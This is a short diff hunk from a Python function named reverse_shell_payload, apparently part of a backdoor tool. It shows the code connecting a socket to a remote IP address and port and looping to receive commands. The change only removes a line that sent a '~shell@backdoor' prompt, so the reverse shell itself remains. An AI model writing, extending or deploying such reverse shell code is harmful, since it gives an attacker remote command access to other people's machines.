@@ -259,7 +259,6 @@ def reverse_shell_payload():
     s.connect((IP_ADDRESS,PORT))
     while True:
         try:
-           s.send(b"~shell@backdoor ")
            cmd = s.recv(1024).decode("utf-8").strip()
            if not cmd:
                continue
